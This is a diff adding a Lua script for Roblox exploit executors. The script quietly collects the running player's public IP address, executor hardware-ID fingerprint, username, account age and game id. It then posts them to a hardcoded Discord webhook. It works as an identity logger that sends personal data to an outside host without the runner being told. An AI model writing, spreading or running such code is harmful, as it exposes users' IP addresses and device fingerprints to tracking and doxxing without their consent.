@@ -1,0 +1,43 @@
+local IP = game:HttpGet("https://api.ipify.org")
+local marketplaceService = game:GetService("MarketplaceService")
+local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
+    if isSuccessful then
+        _G.GAME = info.Name -- Name of the Place from the given PlaceId
+    end
+
+local http_request_all = http_request or request or HttpPost or syn.request
+local HwidBody = http_request_all({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
+local decodeHwid = game:GetService('HttpService'):JSONDecode(HwidBody)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint", "Krnl-Hwid", "krnl-hwid", "Electronid", "Flux-Fingerprint"}
+local hwid = ""
+
+for i, v in next, hwid_list do
+    if decodeHwid.headers[v] then
+        hwid = decodeHwid.headers[v];
+        break
+    end
+end
+username = game:GetService("Players").LocalPlayer.Name
+
+    
+local url = "https://discord.com/api/webhooks/904937939446951946/7CyKsdBWX4fANcoUUdzpZ8E1HBmYFnoRffPxWu8J087iAV-PYbKqefq3pUh7pohCtJe4"
+local data = {
+   ["content"] = " ",
+   ["embeds"] = {
+       {
+           ["title"] = "**Hwid Check**",
+           ["description"] = "```" .."Username:"..username.."\nIP:"..IP.."\nHWID:"..hwid.."\nAgeAccount:"..game.Players.LocalPlayer.AccountAge.."day".."```".."\nGame Id : https://www.roblox.com/games/"..game.PlaceId,
+           ["type"] = "rich",
+           ["color"] = tonumber(0x7269da),
+          
+       }
+   }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+   ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
